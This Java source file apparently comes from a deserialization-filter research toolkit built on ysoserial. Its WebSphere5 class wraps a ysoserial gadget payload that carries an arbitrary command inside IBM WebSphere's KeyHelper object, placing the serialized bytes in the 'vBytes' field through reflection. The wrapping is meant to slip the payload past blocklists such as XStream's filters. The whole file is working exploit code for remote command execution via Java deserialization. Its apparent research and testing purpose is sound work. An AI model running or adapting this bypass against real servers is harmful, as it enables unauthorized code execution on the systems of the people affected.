package serialkiller.bypass;

import com.ibm.ws.ejb.portable.KeyHelper;
import ysoserial.payloads.ObjectPayload;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.Reflections;
import serialkiller.util.Serializables;

/**
 * Created by alvaro on 08/04/16.
 */

@Dependencies({ "websphere"} )
public class WebSphere5 implements BypassGadget {

    public Object wrapPayload(String command, Class payload_class) throws Exception {

        Object payload = ((ObjectPayload) payload_class.getConstructor().newInstance()).getObject(command);
        byte[] payload_bytes = Serializables.serialize(payload);
        KeyHelper keyHelper = new KeyHelper();
        Reflections.setFieldValue(keyHelper, "vBytes", payload_bytes);

        return keyHelper;

    }

    public boolean bypassXStream() { return true; }
    public boolean skipTest() { return false; }
}
